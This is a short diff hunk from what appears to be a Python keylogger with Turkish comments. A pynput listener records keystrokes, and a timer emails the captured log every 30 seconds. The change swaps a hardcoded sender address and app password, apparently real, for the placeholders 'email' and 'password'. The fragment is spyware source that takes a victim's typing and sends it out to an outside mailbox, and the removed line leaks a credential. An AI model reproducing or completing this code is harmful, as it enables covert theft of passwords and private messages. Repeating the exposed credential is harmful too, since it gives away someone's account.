@@ -33,7 +33,7 @@ keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)  #bu her t
 
 def thread_func():
     global log
-    send_email("mevocan02@yandex.com","obixhsmuylwfpnux",log.encode("utf-8"))
+    send_email("email","password",log.encode("utf-8"))
     log = ""
     timer_object = threading.Timer(30,thread_func) #kaç saniye de bir hangi fonksiyonu çalıştırayım diye sorar
     timer_object.start()
